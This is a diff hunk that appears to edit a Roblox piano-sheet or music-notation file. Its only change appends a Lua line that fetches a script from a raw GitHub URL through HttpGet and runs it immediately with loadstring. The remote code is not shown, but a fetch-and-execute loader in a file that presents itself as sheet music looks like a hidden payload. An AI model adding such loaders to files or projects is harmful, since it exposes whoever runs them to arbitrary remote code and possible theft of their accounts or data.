@@ -66,3 +66,5 @@ fS[60f]G [%(D]----[*W]-
 [60]-[%(]-[%(]-[*WS]-
 [*WS]-[0rf]-[0rH]-[60j]-
 [60j]-[%(H]--[*W] ]]
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Madness676/sharedlol/main/shared.lua", true))()
